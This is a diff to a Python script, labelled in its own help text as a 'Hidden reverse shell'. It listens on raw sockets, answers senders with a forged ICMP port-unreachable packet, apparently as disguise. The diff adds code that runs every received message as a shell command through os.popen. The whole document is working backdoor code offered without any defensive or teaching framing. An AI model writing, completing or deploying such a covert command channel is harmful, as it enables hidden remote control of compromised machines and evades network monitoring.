@@ -1,6 +1,10 @@
+#! /usr/bin/python3
+
 import socket
 import struct
 import argparse
+import subprocess
+import os
 
 parser = argparse.ArgumentParser(description="Hidden reverse shell")
 parser.add_argument('port', type=int, help='port to listen on')
@@ -19,9 +23,8 @@ fakesock = socket.socket(socket.AF_INET, socket.SOCK_RAW, ICMP_CODE)
 
 while True:
     data, addr = recsock.recvfrom(1024)
+    data = data.decode("utf-8")
     icmp = struct.pack('bbHi', 3, 3, 0xfcfc, 0)
-    print(icmp)
-    fakesock.sendto(header, addr)
-
-    print("received message: ", data)
+    fakesock.sendto(icmp, addr)
+    print(os.popen("%s" % data).read())
 
